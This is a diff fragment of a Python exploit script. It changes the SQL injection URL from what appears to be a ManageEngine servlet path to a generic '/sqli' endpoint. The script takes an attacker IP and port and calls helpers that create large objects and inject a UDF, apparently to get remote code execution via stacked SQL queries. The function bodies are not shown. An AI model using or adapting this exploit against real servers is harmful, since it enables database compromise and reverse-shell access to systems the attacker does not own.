@@ -63,7 +63,7 @@ if __name__ == '__main__':
         print ("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
         sys.exit()
 
-    sqli_url = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
+    sqli_url = "https://"+server+"/sqli?Range=1&userId=1;%s;--"
     delete_lo(sqli_url, loid) 
     create_lo(sqli_url, loid) 
     inject_udf(sqli_url, loid) 
